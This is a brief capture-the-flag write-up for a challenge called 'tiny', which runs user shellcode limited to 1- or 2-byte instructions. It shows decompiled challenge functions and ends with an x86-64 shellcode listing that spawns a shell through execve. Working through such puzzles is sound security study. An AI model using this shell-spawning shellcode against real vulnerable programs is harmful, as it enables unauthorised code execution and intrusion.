# tiny

The main of this CTF just invoke the play function:
```c
void game(void)
{
  alarm(0x3c);
  welcome();
  play();
  return;
}
```
The welcome() function give us a big hint in how to solve the challenge:
```c
void welcome(void)
{
  puts("Can you pop a shell with a shellcode made of 1 or 2 bytes instructions?");
  return;
}

```
The play() function instead just take the shellcode, check if it is made by 1 or 2 bytes instructions and if this is the case it will execute it.
This is a shellcode that can spawn a shell just with 1 or 2 bytes instructions:
```python
asm_code="""
pop rax
push rdx
pop rax
add al, 18
push rax
pop rdi
push 0x3b
pop rax
push 0
push 0
pop rsi
pop rdx
syscall
"""
```
